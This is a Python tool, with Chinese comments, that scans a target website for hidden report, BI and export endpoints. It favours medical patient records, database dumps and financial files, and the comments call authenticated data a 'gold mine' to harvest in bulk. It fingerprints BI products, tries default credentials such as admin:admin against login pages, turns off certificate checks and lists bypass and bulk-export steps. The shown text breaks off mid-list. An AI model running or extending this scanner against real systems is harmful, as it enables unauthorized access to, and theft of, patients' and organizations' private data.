#!/usr/bin/env python3

#隐藏报表功能发现被低估内容！BI系统是重灾区，找到就是批量数据


import asyncio
import aiohttp
import re
import json
import logging
import sys
import os
from datetime import datetime, timedelta
from urllib.parse import urljoin, parse_qs, urlparse
import ssl
import certifi
import base64

# 导入智能限制管理器
sys.path.append(os.path.dirname(os.path.abspath(__file__)))
from smart_limits import SmartLimitManager, SystemSize

# 导入噪音过滤器 - 防止报表发现中的"傻逼兴奋"
try:
    from .third_party_blacklist import (
        smart_filter,
        is_third_party,
        has_security_value,
        analyze_noise_level,
        filter_third_party_urls
    )
    NOISE_FILTER_AVAILABLE = True
    print(" 噪音过滤器已加载 - 防止BI报表傻逼兴奋")
except ImportError:
    NOISE_FILTER_AVAILABLE = False
    print(" 警告: 噪音过滤器不可用，可能会有大量第三方BI噪音")

# 导入 WAF Defender - 防止WAF欺骗响应
try:
    from .waf_defender import create_waf_defender, WAFDefender
    WAF_DEFENDER_AVAILABLE = True
    print(" WAF Defender已加载 - 防止WAF欺骗响应")
except ImportError:
    WAF_DEFENDER_AVAILABLE = False
    print(" 警告: WAF Defender不可用，可能会受到WAF欺骗")

# 导入认证管理器 - 访问认证后的报表金矿
try:
    from .auth_manager import AuthenticationManager, AuthConfig, create_auth_manager
    AUTH_MANAGER_AVAILABLE = True
    print("认证 认证管理器已加载 - 可访问认证后报表金矿")
except ImportError:
    AUTH_MANAGER_AVAILABLE = False
    print("   警告: 认证管理器不可用 - 无法访问认证后数据")

class HiddenReportFinder:
    def __init__(self, target_url, auth_config=None):
        self.target_url = target_url.rstrip('/')
        self.found_reports = []
        self.bi_systems = []
        self.export_endpoints = []
        self.extracted_data = []
        
        # 认证管理器配置
        self.auth_manager = None
        self.auth_config = auth_config
        if AUTH_MANAGER_AVAILABLE and auth_config:
            try:
                if isinstance(auth_config, dict):
                    auth_config = AuthConfig(**auth_config)
                self.auth_manager = AuthenticationManager(auth_config)
                print("认证 认证管理器初始化成功 - 准备访问认证后报表")
            except Exception as e:
                print(f"   认证管理器初始化失败: {e}")
        
        # 统一session管理
        self.session = None
        
        # 智能限制管理器
        self.limit_manager = SmartLimitManager()
        domain = urlparse(self.target_url).netloc
        target_info = {'domain': domain}
        self.system_size = self.limit_manager.detect_system_size(target_info)
        logging.info(f"[HiddenReportFinder] 检测到系统规模: {self.system_size.value}")
        
        # 噪音过滤统计
        self.noise_stats = {
            'total_paths_tested': 0,
            'noise_filtered': 0,
            'valuable_findings': 0,
            'false_positives_filtered': 0,
            'waf_blocks_detected': 0
        }
        
        # WAF Defender 状态
        self.waf_defender = None
        self.waf_defender_initialized = False
        
        # 技术栈检测结果（用于智能路径生成）
        self.detected_tech_stack = {
            'language': 'unknown',  # java, php, python, nodejs, .net
            'framework': 'unknown',  # spring, laravel, django, express, asp.net
            'bi_systems': [],        # 检测到的BI系统
            'cms': 'unknown',        # wordpress, drupal, joomla
            'country': 'unknown'     # jp, cn, us, eu（影响路径本地化）
        }
        
        # 智能路径缓存
        self.intelligent_paths = []
        self.path_generation_completed = False
        
        # 报表系统路径
        self.report_paths = [
            # 通用报表路径
            '/reports/', '/report/', '/reporting/', '/analytics/',
            '/statistics/', '/stats/', '/dashboard/', '/metrics/',
            '/export/', '/exports/', '/download/', '/downloads/',
            '/data/', '/query/', '/search/', '/view/',
            '/admin/reports/', '/admin/export/', '/admin/stats/',
            '/management/reports/', '/manager/reports/',
            
            # BI系统路径
            '/bi/', '/business-intelligence/', '/intelligence/',
            '/pentaho/', '/jasper/', '/jasperreports/', '/birt/',
            '/crystal/', '/crystalreports/', '/powerbi/', '/tableau/',
            '/qlik/', '/qlikview/', '/cognos/', '/microstrategy/',
            '/reportserver/', '/ssrs/', '/reports/ssrs/',
            
            # 医疗系统特定
            '/patient-reports/', '/medical-reports/', '/health-reports/',
            '/clinic-reports/', '/appointment-reports/', '/prescription-reports/',
            '/診療レポート/', '/患者統計/', '/予約レポート/',
            
            # API路径
            '/api/reports/', '/api/export/', '/api/statistics/',
            '/api/v1/reports/', '/api/v2/reports/', '/rest/reports/',
            '/graphql/', '/_api/reports/', '/odata/',
            
            # 隐藏/临时路径
            '/_reports/', '/.reports/', '/~reports/', '/temp/reports/',
            '/tmp/reports/', '/cache/reports/', '/backup/reports/',
            '/old/reports/', '/legacy/reports/', '/deprecated/reports/'
        ]
        
        # 报表文件名
        self.report_files = [
            # 患者相关
            'patients', 'patient_list', 'patient_summary', 'patient_details',
            'all_patients', 'patient_export', 'patient_data', 'patient_records',
            'medical_records', 'health_records', 'clinical_data',
            
            # 预约相关
            'appointments', 'appointment_list', 'appointment_summary',
            'booking_report', 'schedule_report', 'calendar_export',
            
            # 统计报表
            'statistics', 'summary', 'overview', 'dashboard',
            'monthly_report', 'yearly_report', 'annual_report',
            'daily_summary', 'weekly_summary', 'quarterly_report',
            
            # 导出文件
            'export', 'full_export', 'data_export', 'backup',
            'dump', 'extract', 'download', 'output',
            
            # 日文
            '患者一覧', '診療記録', '予約一覧', '統計情報',
            'レポート', 'エクスポート', 'ダウンロード'
        ]
        
        # 报表参数
        self.report_params = {
            # 时间范围
            'date_from': ['2023-01-01', '2024-01-01'],
            'date_to': ['2024-12-31', datetime.now().strftime('%Y-%m-%d')],
            'start_date': ['2023-01-01', '2024-01-01'],
            'end_date': ['2024-12-31', datetime.now().strftime('%Y-%m-%d')],
            'from': ['2023-01-01', '0'],
            'to': ['2024-12-31', '9999999999'],
            'period': ['all', 'year', 'month', 'custom'],
            'range': ['all', 'thisyear', 'lastyear', 'custom'],
            
            # 数据类型
            'type': ['patient', 'appointment', 'prescription', 'all'],
            'report_type': ['summary', 'detail', 'full', 'export'],
            'format': ['json', 'csv', 'excel', 'pdf', 'xml'],
            'export_format': ['csv', 'xlsx', 'json', 'xml'],
            
            # 分页 (智能限制 - 避免触发防护)
            'limit': self._get_smart_pagination_values(),
            'page_size': self._get_smart_pagination_values(),
            'per_page': self._get_smart_pagination_values(),
            'count': self._get_smart_pagination_values(),
            
            # 其他
            'download': ['true', '1', 'yes'],
            'export': ['true', '1', 'yes'],
            'full': ['true', '1', 'yes'],
            'all': ['true', '1', 'yes']
        }
        
        # BI系统特征
        self.bi_signatures = {
            'pentaho': {
                'paths': ['/pentaho/', '/pentaho-di/', '/biserver/'],
                'files': ['Reporting', 'Report.prpt', 'api/repos'],
                'params': ['renderMode=REPORT', 'output-target=pageable/pdf']
            },
            'jasperreports': {
                'paths': ['/jasperserver/', '/jasper/', '/reports/jasper/'],
                'files': ['flow.html', 'jasperprint', '.jrxml'],
                'params': ['_flowId=viewReportFlow', 'reportUnit=']
            },
            'crystal': {
                'paths': ['/crystalreportviewers/', '/crystal/'],
                'files': ['CrystalReportViewer.aspx', '.rpt'],
                'params': ['ReportSource=', 'id=']
            },
            'ssrs': {
                'paths': ['/ReportServer/', '/Reports/', '/reportserver/'],
                'files': ['Pages/ReportViewer.aspx', '.rdl'],
                'params': ['%2f', 'rs:Command=Render', 'rs:Format=']
            },
            'tableau': {
                'paths': ['/t/', '/views/', '/vizportal/'],
                'files': ['bootstrap.json', 'vizql/'],
                'params': [':embed=y', ':showVizHome=no']
            }
        }

    def _get_smart_pagination_values(self):
        """获取智能分页值.避免触发防护"""
        # 获取基础限制
        base_limit = self.limit_manager.get_api_limit(self.system_size, 'report')
        
        # 生成多种安全的分页值
        values = [
            str(base_limit // 4),      # 保守值 
            str(base_limit // 2),      # 中等值
            str(base_limit),           # 标准值
            str(int(base_limit * 1.5)) # 稍大值
        ]
        
        # 添加一些常见的安全值
        safe_values = ['50', '100', '200', '500']
        for val in safe_values:
            if val not in values:
                values.append(val)
        
        return values

    async def detect_tech_stack(self):
        """检测目标技术栈 - 用于智能路径生成"""
        print("[+] 检测技术栈...")
        
        ssl_context = ssl.create_default_context(cafile=certifi.where())
        conn = aiohttp.TCPConnector(ssl=ssl_context)
        
        async with aiohttp.ClientSession(connector=conn) as session:
            try:
                async with session.get(self.target_url, timeout=10) as resp:
                    headers = dict(resp.headers)
                    content = await resp.text()
                    
                    # 检测编程语言
                    if 'X-Powered-By' in headers:
                        powered_by = headers['X-Powered-By'].lower()
                        if 'php' in powered_by:
                            self.detected_tech_stack['language'] = 'php'
                        elif 'asp.net' in powered_by:
                            self.detected_tech_stack['language'] = '.net'
                    
                    # 检测框架特征
                    if 'jsessionid' in str(resp.url).lower() or 'jsessionid' in content.lower():
                        self.detected_tech_stack['language'] = 'java'
                        if 'spring' in content.lower():
                            self.detected_tech_stack['framework'] = 'spring'
                    
                    # 检测国家/语言特征
                    if any(char in content for char in ['診療', '患者', '予約', 'レポート']):
                        self.detected_tech_stack['country'] = 'jp'
                    elif any(char in content for char in ['诊疗', '患者', '预约', '报表']):
                        self.detected_tech_stack['country'] = 'cn'
                        
                    # 检测CMS
                    if 'wp-content' in content or 'wordpress' in content.lower():
                        self.detected_tech_stack['cms'] = 'wordpress'
                    elif 'drupal' in content.lower():
                        self.detected_tech_stack['cms'] = 'drupal'
                        
                    print(f"    检测到技术栈: {self.detected_tech_stack}")
                    
            except Exception as e:
                print(f"    技术栈检测失败: {e}")

    def generate_intelligent_paths(self):
        """基于技术栈和时间维度生成智能路径"""
        if self.path_generation_completed:
            return self.intelligent_paths
            
        print("[+] 生成智能化报表路径...")
        paths = set()
        
        # 1. 基础报表路径
        base_paths = [
            '/reports/', '/report/', '/reporting/', '/analytics/',
            '/statistics/', '/stats/', '/dashboard/', '/metrics/',
            '/export/', '/exports/', '/download/', '/downloads/'
        ]
        
        # 2. 基于编程语言的路径
        if self.detected_tech_stack['language'] == 'java':
            paths.update([
                '/jasperreports/', '/jasper/', '/birt/', '/pentaho/',
                '/reports/jasperserver/', '/reportserver/', 
                '/WEB-INF/reports/', '/META-INF/reports/'
            ])
        elif self.detected_tech_stack['language'] == 'php':
            paths.update([
                '/phpMyAdmin/export.php', '/adminer.php',
                '/reports/index.php', '/export.php', '/download.php'
            ])
        elif self.detected_tech_stack['language'] == '.net':
            paths.update([
                '/ReportServer/', '/Reports/', '/SSRS/',
                '/CrystalReports/', '/bin/reports/', '/App_Data/reports/'
            ])
        
        # 3. 基于框架的路径
        if self.detected_tech_stack['framework'] == 'spring':
            paths.update([
                '/actuator/export', '/management/export',
                '/api/reports/', '/rest/reports/', '/services/reports/'
            ])
        
        # 4. 基于国家/语言的本地化路径
        if self.detected_tech_stack['country'] == 'jp':
            paths.update([
                '/診療レポート/', '/患者統計/', '/予約レポート/', '/医療記録/',
                '/レポート/', '/統計/', '/ダウンロード/', '/エクスポート/',
                '/reports/患者/', '/reports/診療/', '/data/患者一覧/'
            ])
        elif self.detected_tech_stack['country'] == 'cn':
            paths.update([
                '/诊疗报表/', '/患者统计/', '/预约报表/', '/医疗记录/',
                '/报表/', '/统计/', '/下载/', '/导出/',
                '/reports/患者/', '/reports/诊疗/', '/data/患者列表/'
            ])
        
        # 5. 时间维度路径（当前和历史）
        from datetime import datetime, timedelta
        now = datetime.now()
        
        # 当前时间相关
        current_year = now.year
        current_month = now.month
        current_day = now.day
        
        time_based_paths = []
        for base in ['/reports/', '/export/', '/backup/', '/archive/']:
            # 年度报表
            time_based_paths.extend([
                f'{base}{current_year}/',
                f'{base}{current_year-1}/',
                f'{base}年度/{current_year}/',
                f'{base}yearly/{current_year}/'
            ])
            
            # 月度报表
            time_based_paths.extend([
                f'{base}{current_year}/{current_month:02d}/',
                f'{base}monthly/{current_year}-{current_month:02d}/',
                f'{base}月报/{current_year}-{current_month:02d}/'
            ])
            
            # 日报表
            time_based_paths.extend([
                f'{base}{current_year}/{current_month:02d}/{current_day:02d}/',
                f'{base}daily/{current_year}-{current_month:02d}-{current_day:02d}/',
                f'{base}日报/{current_year}{current_month:02d}{current_day:02d}/'
            ])
        
        paths.update(time_based_paths)
        
        # 6. 基于已检测BI系统的专用路径
        for bi_system in self.detected_tech_stack['bi_systems']:
            if bi_system == 'tableau':
                paths.update([
                    '/t/views/', '/vizportal/api/', '/ts-api/rest/',
                    '/vizql/w/', '/manual_update.csv'
                ])
            elif bi_system == 'powerbi':
                paths.update([
                    '/powerbi/', '/pbi/', '/reports/powerbi/',
                    '/api/powerbi/', '/_api/powerbi/'
                ])
        
        # 7. 隐藏和临时路径
        hidden_paths = [
            '/_reports/', '/.reports/', '/~reports/', '/.well-known/reports/',
            '/temp/reports/', '/tmp/reports/', '/cache/reports/',
            '/backup/reports/', '/old/reports/', '/legacy/reports/',
            '/deprecated/reports/', '/archive/reports/', '/staging/reports/'
        ]
        paths.update(hidden_paths)
        
        # 转换为列表并添加基础路径
        self.intelligent_paths = list(base_paths) + list(paths)
        self.path_generation_completed = True
        
        print(f"    生成了 {len(self.intelligent_paths)} 个智能路径")
        return self.intelligent_paths

    def is_noise_response(self, resp, content=None):
        """智能噪音检测 - 识别404、WAF、错误页面"""
        # 1. 明显的错误状态码
        if resp.status in [404, 500, 502, 503, 504]:
            return True, f"错误状态码: {resp.status}"
        
        # 2. WAF拦截检测
        waf_indicators = [
            'cloudflare', 'incapsula', 'sucuri', 'firewall',
            'blocked', 'forbidden', 'access denied', 'security violation',
            'your request has been blocked', 'this request is blocked'
        ]
        
        content_lower = (content or '').lower()
        page_title = resp.headers.get('title', '').lower()
        server_header = resp.headers.get('server', '').lower()
        
        for indicator in waf_indicators:
            if (indicator in content_lower or 
                indicator in page_title or 
                indicator in server_header):
                self.noise_stats['waf_blocks_detected'] += 1
                return True, f"WAF拦截: {indicator}"
        
        # 3. 默认错误页面检测
        error_patterns = [
            'not found', '404 error', 'page not found',
            'file not found', 'directory not found',
            'default web site page', 'iis7', 'apache2',
            'nginx default page', 'welcome to nginx'
        ]
        
        for pattern in error_patterns:
            if pattern in content_lower:
                return True, f"默认错误页面: {pattern}"
        
        # 4. 第三方服务检测
        if NOISE_FILTER_AVAILABLE:
            if is_third_party(str(resp.url)):
                # 但如果有安全价值，仍然保留
                if not has_security_value(str(resp.url)):
                    return True, "第三方服务噪音"
        
        # 5. 内容大小检测（太小可能是错误页面）
        content_length = int(resp.headers.get('Content-Length', len(content or '')))
        if content_length < 200:  # 小于200字节
            return True, f"内容过小: {content_length}字节"
        
        # 6. 重定向到主页检测
        if resp.status in [301, 302, 307, 308]:
            location = resp.headers.get('Location', '')
            if location in ['/', '/index.html', '/index.php', '/home']:
                return True, f"重定向到主页: {location}"
        
        return False, "正常响应"

    async def _initialize_waf_defender(self):
        """初始化 WAF Defender"""
        if not WAF_DEFENDER_AVAILABLE or self.waf_defender_initialized:
            return
        
        try:
            print("[+] 初始化WAF Defender...")
            
            # 创建临时session用于初始化
            ssl_context = ssl.create_default_context(cafile=certifi.where())
            conn = aiohttp.TCPConnector(ssl=ssl_context)
            
            async with aiohttp.ClientSession(connector=conn) as session:
                self.waf_defender = await create_waf_defender(self.target_url, session)
                self.waf_defender_initialized = True
                
                print(f"    WAF Defender初始化成功 (目标: {self.target_url})")
            
        except Exception as e:
            print(f"    WAF Defender初始化失败: {e}")
            self.waf_defender = None
            self.waf_defender_initialized = False

    async def _validate_response_with_waf(self, url: str, response, expected_type: str = None) -> bool:
        """使用WAF Defender验证响应真实性"""
        if not self.waf_defender or not self.waf_defender_initialized or response.status != 200:
            return True  # 如果WAF Defender不可用或非200状态，默认通过
        
        try:
            is_real = await self.waf_defender.simple_validate(url, response)
            if not is_real:
                print(f"    WAF欺骗检测: {url} - 跳过伪造响应")
                return False
            return True
        except Exception as e:
            print(f"    WAF验证异常: {e}")
            return True  # 异常时默认通过

    async def _create_session(self):
        """创建统一的HTTP session - 支持认证"""
        if self.session and not self.session.closed:
            return self.session
        
        # SSL配置
        ssl_context = ssl.create_default_context(cafile=certifi.where())
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE
        
        # 连接器配置
        conn = aiohttp.TCPConnector(
            ssl=ssl_context,
            limit=100,
            limit_per_host=30,
            ttl_dns_cache=300,
            use_dns_cache=True
        )
        
        # 创建session
        timeout = aiohttp.ClientTimeout(total=30, connect=10)
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        }
        
        self.session = aiohttp.ClientSession(
            connector=conn,
            timeout=timeout,
            headers=headers
        )
        
        return self.session

    async def _safe_request(self, method: str, url: str, **kwargs):
        """安全的HTTP请求 - 支持认证管理器"""
        if not self.session:
            await self._create_session()
        
        # 如果启用了认证管理器，为请求添加认证信息
        if self.auth_manager:
            try:
                kwargs = await self.auth_manager.prepare_request(url, **kwargs)
            except Exception as e:
                print(f"认证 认证准备失败: {e}")
        
        try:
            # 发起请求
            response = await self.session.request(method, url, **kwargs)
            
            # 检查认证状态
            if self.auth_manager:
                auth_ok = await self.auth_manager.handle_response(response, url)
                if not auth_ok and self.auth_manager.should_retry(response):
                    # 认证失效，尝试恢复
                    print("[!] 检测到认证失效，尝试恢复...")
                    await response.release()  # 释放连接
                    
                    recovery_success = await self.auth_manager._recover_authentication()
                    if recovery_success:
                        # 重新准备请求
                        kwargs = await self.auth_manager.prepare_request(url, **kwargs)
                        # 重试请求
                        response = await self.session.request(method, url, **kwargs)
            
            return response
            
        except Exception as e:
            print(f"认证 请求异常: {e}")
            return None

    async def _cleanup_session(self):
        """清理session资源"""
        if self.session and not self.session.closed:
            await self.session.close()
        
        if self.auth_manager:
            try:
                await self.auth_manager.cleanup()
            except Exception as e:
                print(f"认证 认证管理器清理异常: {e}")

    async def run(self):
        """主执行函数 - 智能化升级版 + 认证支持"""
        print(f"[*]  开始智能化隐藏报表功能发现: {self.target_url}")
        print(f"[*] 时间: {datetime.now()}")
        noise_status = "OK" if NOISE_FILTER_AVAILABLE else "错误"
        waf_status = "OK" if WAF_DEFENDER_AVAILABLE else "错误"
        auth_status = "认证OK" if self.auth_manager else "🔓"
        print(f"[*] 噪音过滤: {noise_status}")
        print(f"[*] WAF防护: {waf_status}")
        print(f"[*] 认证管理: {auth_status}")
        
        try:
            # 初始化组件
            await self._create_session()
            await self._initialize_waf_defender()
            
            # 初始化认证管理器
            if self.auth_manager:
                await self.auth_manager.initialize()
                print("认证 认证管理器初始化完成 - 准备访问认证后报表金矿")
                
                # 显示认证统计
                auth_stats = self.auth_manager.get_auth_stats()
                auth_type = auth_stats.get('current_auth_type', 'unknown')
                print(f"认证 认证类型: {auth_type}")
            
            # 0. 技术栈检测（新增 - 用于智能路径生成）
            await self.detect_tech_stack()
            
            # 1. 生成智能路径（新增 - 基于技术栈）
            self.generate_intelligent_paths()
            
            # 2. 探测BI系统（增强版）
            await self.detect_bi_systems_enhanced()
            
            # 3. 发现报表端点（智能过滤版）
            await self.discover_report_endpoints_smart()
            
            # 4. 深度参数枚举（新增）
            await self.deep_parameter_enumeration()
            
            # 5. 测试报表参数（增强版）
            await self.test_report_parameters_enhanced()
            
            # 6. 尝试批量导出（智能版）
            await self.attempt_bulk_export_smart()
            
            # 7. 探测GraphQL（增强版）
            await self.detect_graphql_enhanced()
            
            # 8. 隐藏路径发现（新增）
            await self.discover_hidden_paths()
            
            # 9. 权限绕过尝试（新增）
            await self.attempt_bypass_techniques()
            
            # 10. 生成智能报告
            self.generate_smart_report()
            
            return self.found_reports
            
        except Exception as e:
            print(f"[!] 隐藏报表发现异常: {e}")
            raise
        finally:
            # 清理资源
            await self._cleanup_session()

    async def detect_bi_systems_enhanced(self):
        """增强版BI系统探测 - 集成噪音过滤"""
        print("[+]  增强版BI系统探测...")
        
        # 扩展BI系统特征库（包含日本主流BI）
        enhanced_bi_signatures = {
            'pentaho': {
                'paths': ['/pentaho/', '/pentaho-di/', '/biserver/', '/pentaho/content/'],
                'files': ['Reporting', 'Report.prpt', 'api/repos', 'pentaho.xml'],
                'params': ['renderMode=REPORT', 'output-target=pageable/pdf'],
                'headers': ['x-pentaho-depth']
            },
            'jasperreports': {
                'paths': ['/jasperserver/', '/jasper/', '/reports/jasper/', '/jasperserver/rest/'],
                'files': ['flow.html', 'jasperprint', '.jrxml', 'reportExecution'],
                'params': ['_flowId=viewReportFlow', 'reportUnit=', 'j_username='],
                'headers': ['jasperserver-pro']
            },
            'tableau': {
                'paths': ['/t/', '/views/', '/vizportal/', '/ts-api/', '/manual_update.csv'],
                'files': ['bootstrap.json', 'vizql/', 'workbooks', 'datasources'],
                'params': [':embed=y', ':showVizHome=no', ':toolbar=no'],
                'headers': ['x-tableau-feature-flags']
            },
            'powerbi': {
                'paths': ['/powerbi/', '/pbi/', '/reports/powerbi/', '/reportserver/'],
                'files': ['models.json', 'reports/', 'dashboards/', 'datasets/'],
                'params': ['reportId=', 'groupId=', 'datasetId='],
                'headers': ['x-powerbi-error-info']
            },
            'qlik': {
                'paths': ['/qmc/', '/hub/', '/sense/', '/qlikview/', '/accesspoint/'],
                'files': ['qlik-embed.js', 'qlik.js', 'session.js'],
                'params': ['qlikTicket=', 'QvUser='],
                'headers': ['x-qlik-user']
            },
            # 日本主流BI系统
            'motionboard': {
                'paths': ['/motionboard/', '/mb/', '/MotionBoard/'],
                'files': ['MBServlet', 'motionboard.js'],
                'params': ['boardId=', 'userId='],
                'headers': ['x-motionboard']
            },
            'yellowfin': {
                'paths': ['/yellowfin/', '/yf/', '/reports/yellowfin/'],
                'files': ['yellowfin.js', 'rptws/', 'logon.jsp'],
                'params': ['reportId=', 'orgId='],
                'headers': ['yellowfin-version']
            },
            'dr_sum': {
                'paths': ['/DrSum/', '/drsum/', '/MotionBoard/'],
                'files': ['DrSum.js', 'drs/', 'pivot/'],
                'params': ['dr_id=', 'connection='],
                'headers': ['x-drsum']
            }
        }
        
        # 使用统一的session管理（支持认证）
        ssl_context = ssl.create_default_context(cafile=certifi.where())
        conn = aiohttp.TCPConnector(ssl=ssl_context)
        
        async with aiohttp.ClientSession(connector=conn) as session:
            for bi_name, signatures in enhanced_bi_signatures.items():
                print(f"    检测 {bi_name} BI系统...")
                
                for path in signatures['paths']:
                    url = urljoin(self.target_url, path)
                    self.noise_stats['total_paths_tested'] += 1
                    
                    try:
                        resp = await self._safe_request('GET', url, timeout=aiohttp.ClientTimeout(total=15), allow_redirects=True)
                        if not resp:
                            continue
                            
                        # 使用with语句管理响应
                        async with resp:
                            content = await resp.text() if resp.status == 200 else ""
                            
                            # 智能噪音检测
                            is_noise, noise_reason = self.is_noise_response(resp, content)
                            if is_noise:
                                self.noise_stats['noise_filtered'] += 1
                                print(f"       过滤噪音: {path} ({noise_reason})")
                                continue
                            
                            if resp.status in [200, 401, 403]:
                                # 检查特征
                                found_signatures = []
                                confidence_score = 0
                                
                                # 文件特征检查
                                for sig in signatures.get('files', []):
                                    if sig.lower() in content.lower() or sig.lower() in str(resp.url).lower():
                                        found_signatures.append(sig)
                                        confidence_score += 20
                                
                                # 头部特征检查
                                for header in signatures.get('headers', []):
                                    if header.lower() in [h.lower() for h in resp.headers.keys()]:
                                        found_signatures.append(f"header:{header}")
                                        confidence_score += 30
                                
                                # 参数特征检查（在URL中）
                                for param in signatures.get('params', []):
                                    if param.lower() in str(resp.url).lower():
                                        found_signatures.append(f"param:{param}")
                                        confidence_score += 15
                                
                                # 内容关键词检查
                                bi_keywords = {
                                    'pentaho': ['pentaho', 'pdi', 'spoon', 'kettle'],
                                    'jasperreports': ['jaspersoft', 'jasperserver', 'ireport'],
                                    'tableau': ['tableau', 'vizql', 'workbook'],
                                    'powerbi': ['powerbi', 'power bi', 'microsoft.powerbi'],
                                    'qlik': ['qlikview', 'qlik sense', 'qliksense'],
                                    'motionboard': ['motionboard', 'モーションボード'],
                                    'yellowfin': ['yellowfin', 'イエローフィン'],
                                    'dr_sum': ['drsum', 'dr.sum', 'ディーアールサム']
                                }
                                
                                for keyword in bi_keywords.get(bi_name, []):
                                    if keyword.lower() in content.lower():
                                        confidence_score += 25
                                        found_signatures.append(f"keyword:{keyword}")
                                
                                if found_signatures or resp.status in [401, 403] or confidence_score > 30:
                                    print(f"       发现 {bi_name} BI系统: {url}")
                                    print(f"         置信度: {confidence_score}%")
                                    print(f"         特征: {found_signatures[:3]}")  # 只显示前3个特征
                                    
                                    self.noise_stats['valuable_findings'] += 1
                                    self.detected_tech_stack['bi_systems'].append(bi_name)
                                    
                                    bi_info = {
                                        'name': bi_name,
                                        'url': url,
                                        'status': resp.status,
                                        'signatures': found_signatures,
                                        'confidence': confidence_score,
                                        'version': self._extract_version(content, bi_name),
                                        'auth_required': resp.status in [401, 403]
                                    }
                                    
                                    self.bi_systems.append(bi_info)
                                    
                                    # 如果是401/403，可能需要认证
                                    if resp.status in [401, 403]:
                                        print(f"          需要认证 (状态: {resp.status})")
                                        await self._test_default_credentials(session, url, bi_name)
                                            
                    except Exception as e:
                        print(f"        连接失败: {path} ({str(e)[:50]})")
                        continue

    def _extract_version(self, content, bi_name):
        """提取BI系统版本信息"""
        version_patterns = {
            'pentaho': [r'pentaho[_\s]*(?:version|v)?[_\s]*([0-9]+\.[0-9]+(?:\.[0-9]+)?)', 
                       r'pdi[_\s]*([0-9]+\.[0-9]+)'],
            'jasperreports': [r'jasperserver[_\s]*([0-9]+\.[0-9]+(?:\.[0-9]+)?)',
                            r'jasperreports[_\s]*([0-9]+\.[0-9]+)'],
            'tableau': [r'tableau[_\s]*(?:version|v)?[_\s]*([0-9]+\.[0-9]+(?:\.[0-9]+)?)',
                       r'"version":"([0-9]+\.[0-9]+[^"]*)"'],
            'powerbi': [r'powerbi[_\s]*(?:version|v)?[_\s]*([0-9]+\.[0-9]+)',
                       r'"version"\s*:\s*"([^"]*)"'],
        }
        
        patterns = version_patterns.get(bi_name, [])
        for pattern in patterns:
            match = re.search(pattern, content, re.I)
            if match:
                return match.group(1)
        return 'unknown'

    async def _test_default_credentials(self, session, url, bi_name):
        """测试BI系统默认凭据"""
        default_creds = {
            'pentaho': [('admin', 'password'), ('admin', 'admin'), ('demo', 'demo')],
            'jasperreports': [('jasperadmin', 'jasperadmin'), ('admin', 'admin')],
            'tableau': [('admin', 'admin'), ('tableau', 'tableau')],
            'powerbi': [],  # PowerBI通常使用OAuth
            'qlik': [('admin', 'admin'), ('qlikview', 'qlikview')],
            'motionboard': [('admin', 'admin'), ('mb_admin', 'mb_admin')],
            'yellowfin': [('admin@yellowfin.com.au', 'test'), ('admin', 'admin')],
            'dr_sum': [('admin', 'admin'), ('drsum', 'drsum')]
        }
        
        creds = default_creds.get(bi_name, [])
        if not creds:
            return
            
        print(f"          测试默认凭据...")
        
        for username, password in creds:
            # 构造登录URL
            login_urls = [
                f"{url}j_spring_security_check",  # Spring Security
                f"{url}login", 
                f"{url}login.jsp",
                f"{url}logon.jsp",
                f"{url}auth/login",
                f"{url}rest/login"
            ]
            
            for login_url in login_urls:
                try:
                    auth_data = {
                        'j_username': username, 'j_password': password,
                        'username': username, 'password': password,
                        'user': username, 'pass': password
                    }
                    
                    async with session.post(login_url, data=auth_data, timeout=10) as resp:
                        if resp.status in [200, 302] and 'login' not in str(resp.url).lower():
                            print(f"          发现有效凭据: {username}:{password}")
                            return username, password
                            
                except Exception:
                    continue
        
        return None

    async def discover_report_endpoints_smart(self):
        """智能报表端点发现 - 集成噪音过滤和智能路径"""
        print("[+]  智能报表端点发现...")
        
        ssl_context = ssl.create_default_context(cafile=certifi.where())
        conn = aiohttp.TCPConnector(ssl=ssl_context)
        
        async with aiohttp.ClientSession(connector=conn) as session:
            # 使用智能生成的路径
            test_paths = self.intelligent_paths
            print(f"    使用 {len(test_paths)} 个智能路径")
            
            # 智能并发控制
            semaphore = asyncio.Semaphore(10)  # 控制并发数
            tasks = []
            
            # 测试目录路径
            for path in test_paths[:50]:  # 限制数量避免过度扫描
                tasks.append(self._check_report_path_smart(session, semaphore, path))
            
            # 测试具体报表文件
            valuable_files = self._get_prioritized_filenames()
            for path in test_paths[:20]:  # 减少路径数量
                for filename, priority in valuable_files[:15]:  # 优先级排序
                    for ext in ['.json', '.csv', '.xlsx', '.pdf', '']:
                        full_path = f"{path.rstrip('/')}/{filename}{ext}"
                        tasks.append(self._check_report_path_smart(session, semaphore, full_path))
            
            print(f"    执行 {len(tasks)} 个并发检测任务...")
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            # 收集有效端点（过滤异常和None）
            valid_endpoints = [r for r in results if r is not None and not isinstance(r, Exception)]
            self.export_endpoints.extend(valid_endpoints)
            
            print(f"     发现 {len(valid_endpoints)} 个有效报表端点")
            
            # 噪音过滤统计
            if self.noise_stats['total_paths_tested'] > 0:
                noise_ratio = self.noise_stats['noise_filtered'] / self.noise_stats['total_paths_tested']
                if noise_ratio > 0.4:
                    print(f"     噪音过滤效果: {self.noise_stats['noise_filtered']}/{self.noise_stats['total_paths_tested']} ({noise_ratio:.1%})")
                    print(f"     成功避免了报表发现'傻逼兴奋' - 大量噪音被过滤")

    def _get_prioritized_filenames(self):
        """获取按优先级排序的文件名"""
        files_with_priority = [
            # 高价值文件 (优先级: 高)
            ('patients', 90), ('patient_list', 90), ('patient_export', 85),
            ('users', 85), ('user_list', 85), ('all_users', 80),
            ('admin_export', 95), ('full_export', 90), ('complete_export', 85),
            ('database_dump', 95), ('backup', 85), ('dump', 80),
            
            # 医疗相关 (优先级: 中高)
            ('medical_records', 80), ('health_records', 75), ('appointments', 75),
            ('prescriptions', 70), ('clinic_data', 70),
            
            # 财务相关 (优先级: 中高)  
            ('financial_report', 80), ('billing', 75), ('payments', 70),
            ('revenue', 70), ('accounting', 65),
            
            # 统计报表 (优先级: 中)
            ('statistics', 60), ('summary', 60), ('dashboard', 55),
            ('monthly_report', 55), ('yearly_report', 55), ('analytics', 50),
            
            # 日文文件 (优先级: 根据地区调整)
            ('患者一覧', 90 if self.detected_tech_stack['country'] == 'jp' else 30),
